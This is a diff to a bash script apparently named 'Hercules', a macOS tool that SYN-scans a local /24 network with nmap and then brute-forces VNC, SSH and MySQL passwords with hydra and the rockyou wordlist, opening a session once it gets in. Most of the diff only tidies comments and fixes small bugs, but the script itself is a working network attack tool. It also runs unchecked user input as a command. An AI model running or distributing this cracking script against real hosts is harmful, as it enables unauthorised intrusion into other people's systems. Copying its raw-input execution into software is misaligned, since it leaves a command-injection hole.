@@ -3,10 +3,10 @@ GREEN='\033[0;32m'
 RED='\033[0;31m'
 NC='\033[0m' # No Color
 
-#os of the computer
+# OS of the computer
 OS="darwin"
 
-#for the wget functionality to work
+# For the wget functionality to work
 SITE_URL="https://google.com"
 
 # Root user
@@ -16,10 +16,10 @@ empty=("")
 
 alphabet=("a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "x" "y" "z" "A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "X" "Y" "Z")
 
-#the yes array that contains the yes input
+# The yes array that contains the yes input
 yes=("yes" "YES" "y" "Y")
 
-#the array that contains the exit input
+# The array that contains the exit input
 exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")
 
 # Gets the current time in a 12-hour format
@@ -28,12 +28,8 @@ CURRENT_TIME=$(date +"%I:%M:%S %p")
 # Gets current date in mm/dd/yyyy format
 CURRENT_DATE=$(date +"%m/%d/%Y")
 
-# List of required packages/commands
-required_packages=("wget",
-                   "nmap",
-                   "hydra",
-                   "ssh",
-                   "mysql")
+# List of required packages/commands (separated by spaces)
+required_packages=("wget" "nmap" "hydra" "ssh" "mysql")
 
 # Function to check if a command exists
 command_exists() {
@@ -49,12 +45,13 @@ fi
 # Check for required packages
 for package in "${required_packages[@]}"; do
   if ! command_exists "$package"; then
-    echo -e "ERROR: The required package ${GREEN}'${required_packages[*]}'${NC} is not installed. Please install it and try again."
+    echo -e "ERROR: The required package ${GREEN}'$package'${NC} is not installed. Please install it and try again."
     exit 1
   fi
 done
-#when the user enters script --help it outputs the help message
-if [ "$1" = "--help" || "$1" = "-h" ]; then
+
+# Check if the script is run with --help or -h
+if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     figlet "? HELP ?"
     echo
     echo "+++++++++++++++Programs used+++++++++++++++"
@@ -79,30 +76,29 @@ else
             sudo rm -rf hydra.restore
             clear
 
-            # trys to connecto to the server
+            # Try to connect to the server
             wget -q --spider $SITE_URL
 
             # If the user is connected to the internet, it works as normal
             if [[ $? -eq 0 ]]; then
                 echo
-            
             # Else, it notifies them that they are not connected to the internet and tells them to connect
             else
                 # Error message if offline notification
                 offlineTitle="Offline"
                 offline="TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
                 osascript -e "display notification \"$offline\" with title \"$offlineTitle\""
-                
-                #offline text in the terminal
+
+                # Offline text in the terminal
                 echo "ERROR:root:TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}." >> ERROR.LOG
                 echo "TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
                 exit 1
             fi
 
-            # clear the terminal
+            # Clear the terminal
             clear
 
-            #tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
+            # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
             Hercules() {
                 # The logo of the program
                 figlet -f slant "Hercules"
@@ -122,28 +118,28 @@ else
                     read -p ">>> " Hydra
 
                     if [[ " ${exit[*]} " == *" $Hydra "* ]]; then
-                        echo "GoodBye"
+                        echo "Goodbye"
                         exit
                     else
                         $Hydra
                         exit
                     fi
 
-                #if the user asks what the program doess it goes to a funciton that helps them and explains what the program does
+                # If the user asks what the program does, it goes to a function that helps them and explains what the program does
                 elif [[ " ${exit[*]} " == *" $service "* ]]; then
-                    echo "Stoping program..."
+                    echo "Stopping program..."
                     sleep 1
                     exit
                 elif [[ " ${empty[*]} " == *" $service "* ]]; then
                     clear
                     Hercules
 
-                #if the user input something that is not a number it says error
+                # If the user input something that is not a number it says error
                 elif [[ " ${alphabet[*]} " == *" $service "* ]]; then
-                    echo "ERROR please input a number next time"
+                    echo "ERROR: Please input a number next time"
                     sleep 5
                     clear
-                    Hercules                
+                    Hercules
                 else
                     # Scan specific port
                     sudo nmap -sS 192.168.1.1/24 -p $service --open
@@ -151,9 +147,9 @@ else
             }
 
             RunHackingCommand() {
-                #break in the outputs of my code
-                echo 
-                #services to crack the network
+                # Break in the outputs of my code
+                echo
+                # Services to crack the network
                 echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
                 echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                 read -p "Input Username: " user
@@ -173,19 +169,19 @@ else
                     else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
-                        #alerts the user that the computer is trying to connect to the VNC server
+                        # Alerts the user that the computer is trying to connect to the VNC server
                         title="Connecting to ${user}"
-                        Connecting_To_VNC_SERVER="We are connecting you to ${user} plase wait..."
+                        Connecting_To_VNC_SERVER="We are connecting you to ${user}. Please wait..."
                         osascript -e "display notification \"$Connecting_To_VNC_SERVER\" with title \"$title\""
-                        
+
                         sleep 5
 
-                        # it connects to the ssh server and asks for the user to input a password to connect to the ssh server
-                        #notifcation for the user to see the computer is connected to the VNC server
+                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
+                        # Notification for the user to see the computer is connected to the VNC server
                         title="Enter password to ${user}"
-                        Connected_To_VNC_SERVER="We have conncted you to ${user} Plase enter the password to ${user} to continue..."
+                        Connected_To_VNC_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                         osascript -e "display notification \"$Connected_To_VNC_SERVER\" with title \"$title\""
-                        # put the 
+                        # Put the
                         echo "Loading VNC server..."
                         open vnc://$host
                         exit
@@ -207,18 +203,18 @@ else
 
                         # Crack SSH password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
-                        #alerts the user that the computer is trying to connect to the ssh server
+                        # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${user}"
-                        Connecting_To_SSH_SERVER="We are connecting you to ${user} plase wait..."
+                        Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
                         osascript -e "display notification \"$Connecting_To_SSH_SERVER\" with title \"$title\""
-                        
+
                         sleep 5
 
-                        # it connects to the ssh server and asks for the user to input a password to connect to the ssh server
+                        # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                         title="Enter password to ${user}"
-                        Connected_To_SSH_SERVER="We have conncted you to ${user} Plase enter the password to ${user} to continue..."
+                        Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
                         osascript -e "display notification \"$Connected_To_SSH_SERVER\" with title \"$title\""
-                        
+
                         ssh $user@$host
                     fi
                 fi
@@ -243,7 +239,7 @@ else
                     fi
                 fi
             }
-            
+
             Hercules # Calls the Hercules function
 
             RunHackingCommand # Calls the RunHackingCommand function
